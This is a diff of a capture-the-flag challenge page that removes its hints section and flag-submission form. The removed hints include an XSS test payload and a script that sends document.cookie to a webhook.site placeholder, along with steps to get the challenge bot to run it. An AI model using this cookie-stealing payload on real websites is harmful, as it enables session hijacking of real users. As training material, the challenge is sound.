@@ -179,51 +179,6 @@
           <p>Craft an XSS payload that exfiltrates <code>document.cookie</code> to a webhook, then report that URL to the bot.</p>
         </div>
 
-        <div class="sec-divider"><h3>Hints</h3></div>
-        <div class="hints-list">
-
-          <div class="hint-card">
-            <div class="hint-header" onclick="toggleHint(1)">
-              <span>💡 HINT 1</span>
-              <span class="hint-cost tag tag-green">−25 pts</span>
-              <span class="hint-toggle" id="hint1-toggle">▼ Reveal</span>
-            </div>
-            <div class="hint-body hidden" id="hint1-body">
-              Confirm XSS first. Try this in the search box:<br/><br/>
-              <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br/><br/>
-              If a popup appears, the page is vulnerable.
-            </div>
-          </div>
-
-          <div class="hint-card">
-            <div class="hint-header" onclick="toggleHint(2)">
-              <span>💡 HINT 2</span>
-              <span class="hint-cost tag tag-red">−50 pts</span>
-              <span class="hint-toggle" id="hint2-toggle">▼ Reveal</span>
-            </div>
-            <div class="hint-body hidden" id="hint2-body">
-              Use <code>document.cookie</code> to steal the cookie and send it to a webhook:<br/><br/>
-              <code>&lt;script&gt;fetch('https://webhook.site/YOUR-ID?c='+document.cookie)&lt;/script&gt;</code><br/><br/>
-              Replace <code>YOUR-ID</code> with your real webhook.site ID.
-            </div>
-          </div>
-
-          <div class="hint-card">
-            <div class="hint-header" onclick="toggleHint(3)">
-              <span>💡 HINT 3</span>
-              <span class="hint-cost tag tag-purple">−75 pts</span>
-              <span class="hint-toggle" id="hint3-toggle">▼ Reveal</span>
-            </div>
-            <div class="hint-body hidden" id="hint3-body">
-              URL-encode your full payload and submit it as the report URL.<br/><br/>
-              The bot will visit:<br/>
-              <code>/search?q=&lt;script&gt;fetch(...)&lt;/script&gt;</code><br/><br/>
-              It will execute the script in its browser context where <code>document.cookie</code> contains the flag.
-            </div>
-          </div>
-
-        </div>
-
         <div class="sec-divider"><h3>Attack Flow</h3></div>
         <div class="attack-flow">
           <div class="flow-step">
@@ -266,17 +221,6 @@
             </div>
           </div>
         </div>
-
-        <div class="sec-divider"><h3>Submit Flag</h3></div>
-        <div class="flag-submit-panel">
-          <div class="form-group flag-input-wrap">
-            <span class="flag-prefix">FlagVault{</span>
-            <input class="form-control" id="flag-input" type="text" placeholder="your_flag_here" autocomplete="off"/>
-          </div>
-          <button class="btn btn-primary" onclick="submitFlag()" style="width:100%">&gt;_ SUBMIT FLAG</button>
-          <div class="submit-result" id="flag-result"></div>
-        </div>
-
         <!-- Payload builder tool -->
         <div class="sec-divider"><h3>Payload Builder <span class="tag tag-green">Tool</span></h3></div>
         <div class="payload-builder">
